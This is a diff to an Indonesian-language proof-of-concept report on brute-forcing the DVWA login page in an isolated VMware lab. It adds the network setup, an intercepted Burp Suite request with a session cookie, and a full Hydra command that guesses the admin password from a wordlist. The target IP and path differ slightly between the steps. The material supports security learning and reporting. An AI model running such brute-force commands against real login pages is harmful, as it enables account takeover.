@@ -23,6 +23,7 @@ Kerentanan ini masuk pada kategori salah satu penyebab utama account takeover da
 Pengujian berikut yang terkemas sebagai bagian dari Proof of Concept terbagi menjadi 4 tahap.
 
 **Tahap 1: Reconnaissance and Traffic Interception**
+
 Pengujian ini termasuk pada White Box testing sehingga tidak perlu melakukan reconnaissance lebih jauh. Di samping itu, pengujian ini mengidealkan setidaknya satu sistem operasi, sebagai host atau guest. Namun, untuk mencegah dampak pengujian yang tidak diinginkan maka disarankan menggunakan guest OS di dalam VMware Workstation.
 
 Pengujian yang dilakukan ini menggunakan dua (2) sistem operasi, yaitu Parrot OS sebagai host dan Kali Linux sebagai guest yang terisolasi di dalam VMware Workstation. Kedua OS ini terhubung ke dalam satu jaringan fisik yang sama, yaitu 192.168.1.0/24, yang mana host dengan IPv4 address 192.168.1.10/24 dan guest dengan IPv4 address 192.168.1.12/24 dengan konfigurasi jaringan berupa bridge network adapter. Kemudian,, di dalam guest, telah dipasang dan dikonfigurasi Damn Vulnerable Web Application (DVWA) sebagai environment assessment.
@@ -36,11 +37,31 @@ Berikut informasi tools dan kegunaannya pada pengujian ini.
 - Wordlist = candidate password set
 - curl = low-level manual request verification and diagnostics
 
-Visualisasi tahap 1 dapat dilihat pada gambar berikut:
-![Infrastructure Visualization](https://github.com/troders34/DVWA-Reporting/Images/Networks_and_Tools_Visualization.png)
-
 **Tahap 2: HTTP Request and Cookie Analysis**
+
+_Intercepted request di Burp Suite_
+> GET /DVWA/vulnerabilities/brute/?username=admin&password=test&Login=Login HTTP/1.1
+>
+> Host: 192.168.1.10
+>
+> Referer: http://192.168.1.10/DVWA/vulnerabilities/brute/
+>
+> Cookie: security=low; PHPSESSID=857da***dfe44
+
+Dari intercepted request yang terdapat di Burp Suite pada percobaan pertama, hal yang perlu diperhatikan dan dicatat adalah **Cookie ID**, sedangkan username dan password boleh saja belum sesuai. Cookie atau Session ID ini berfungsi untuk authentication token saat mengoperasikan Hydra dan string valuenya harus sesuai, sebab tanpanya permintaan ke vulnerable page justru akan diarahkan ke laman login utama DVWA, bukan ke laman login Brute Force.
+
 **Tahap 3: Exploitation via Hydra**
+
+> hydra -l admin \
+>
+>   -P ~/dvwa_wordlist.txt \
+>
+>   127.0.0.1 \
+>
+>   http-get-form \
+>
+>   "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=abc123xyz; security=low:F=Username and/or password incorrect."
+
 **Tahap 4: Verification**
 
 # Affected Demographic
